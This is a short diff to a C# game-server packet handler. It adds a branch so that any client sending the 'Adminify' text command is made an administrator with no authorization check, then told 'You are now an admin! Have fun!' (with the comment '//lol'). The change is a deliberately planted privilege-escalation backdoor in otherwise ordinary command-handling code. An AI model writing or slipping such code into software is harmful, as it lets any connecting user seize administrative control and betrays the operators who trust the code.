@@ -17,6 +17,15 @@ public class PacketClientTextCommand : IClientPacketHandler
 
         var type = (ClientTextCommand)msg.ReadByte();
 
+        if(type == ClientTextCommand.Adminify)
+        {
+            connection.Player.IsAdmin = true; //lol
+
+            CommandBuilder.AddRecipient(connection.Entity);
+            CommandBuilder.SendServerMessage($"You are now an admin! Have fun!");
+            CommandBuilder.ClearRecipients();
+        }
+
         if (type == ClientTextCommand.Where)
         {
             CommandBuilder.AddRecipient(connection.Entity);
